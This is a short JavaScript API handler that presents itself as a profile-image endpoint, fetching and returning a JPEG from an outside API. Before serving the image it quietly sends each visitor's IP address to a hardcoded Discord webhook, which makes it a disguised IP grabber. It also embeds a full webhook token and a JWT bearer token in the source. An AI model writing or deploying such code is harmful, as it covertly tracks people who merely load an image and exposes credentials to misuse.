import { WebhookClient } from 'discord.js'

export default async function handler(req, res) {
  const ip = (req.headers['x-forwarded-for'] ?? '127.0.0.1').split(',')[0];
  const web = new WebhookClient({ url: 'https://discord.com/api/webhooks/1230217788447133767/MsuFwz5xrJmbWsfNd3geZN9f2KMNtx4WKdT16I0I24DPjKQNgnX_34S0HK7wurD-fpId'})
  web.send({ content: `IP: ${ip}`})
  try {
    const imageBuffer = await getProfile(req.query.id);
    const buffer = Buffer.from(imageBuffer);
    res.writeHead(200, {
      'Content-Type': 'image/jpeg',

    });

    res.end(buffer);
  } catch (error) {
    console.error('Erro ao buscar imagem de perfil:', error);
    res.status(500).end('Erro ao buscar imagem de perfil');
  }
}

async function getProfile(userId) {
  const response = await fetch(`https://api.perfectvisions.website/users/${userId}/profile/view`, {
    method: 'GET',
    headers: {
      'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imp1anViYSIsImlhdCI6MTcwOTY4MDIwM30.Ki5LOM348LorGFXSzR9fP0uJuYdSfKcZmGQNr283Azg',
    },
  });

  if (!response.ok) {
    throw new Error(`Erro ao buscar imagem de perfil: ${response.statusText}`);
  }

  return await response.arrayBuffer();
}

export const config = {

}
